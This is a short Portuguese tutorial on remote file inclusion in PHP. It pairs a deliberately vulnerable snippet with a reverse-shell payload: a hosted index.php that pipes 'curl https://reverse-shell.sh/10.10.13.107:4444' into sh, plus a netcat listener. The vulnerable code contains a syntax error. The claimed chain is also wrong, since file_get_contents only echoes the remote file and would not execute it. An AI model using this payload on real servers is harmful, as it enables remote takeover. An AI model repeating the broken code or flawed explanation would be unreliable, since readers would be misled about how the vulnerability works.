Remote file inclusion

Podemos fazer a inclusão remota de arquivos no servidor alvo, em certos cenários podemos até executar comandos remotamente (RCE) no servidor alvo.

Existe como executar código de RFI em lugar vulneráveis a LFI? Não no caso do exemplo anterior, porque normalmente nas falha LFI apresentada não podemos manipular os schemas de URL (http, ftp, file, etc).

No caso um código vulnerável a RFI não poderia ter hardcoded `pages/` antes do valor buscado pelo `file_get_contents`, ficaria da seguinte maneira:

```php
<?php
    if(isset($_GET['page']) AND !empty($_GET['page'])) {
        echo file_get_contents(.$_GET['page']);
    } else {
        echo file_get_contents("pages/home.html");
    }
?>
```

Como podemos perceber, se o parâmetro page existir, ele vai pegar diretamente do input da URI e passar para o `file_get_contents`, e assim é possível executar RFI.

Por exemplo, podemos subir um servidor python da seguinte maneira:

`python -m SimpleHTTPServer 1234`

Lembrando que os arquivos PHP nesse caso não podem ser executados pelo servidor de ataque, podem apenas ser hosteado para download.

Na pasta onde o servidor python é startado existe um arquivo chamado index.php com o seguinte conteúdo:

```php
<?php
    system('curl https://reverse-shell.sh/10.10.13.107:4444 | sh');
?>
```

E na nossa máquina estamos escutando com netcat (nc) na porta 4444 através do comando:

`nc -lvp 4444`

E pronto, temos uma reverse shell conectada.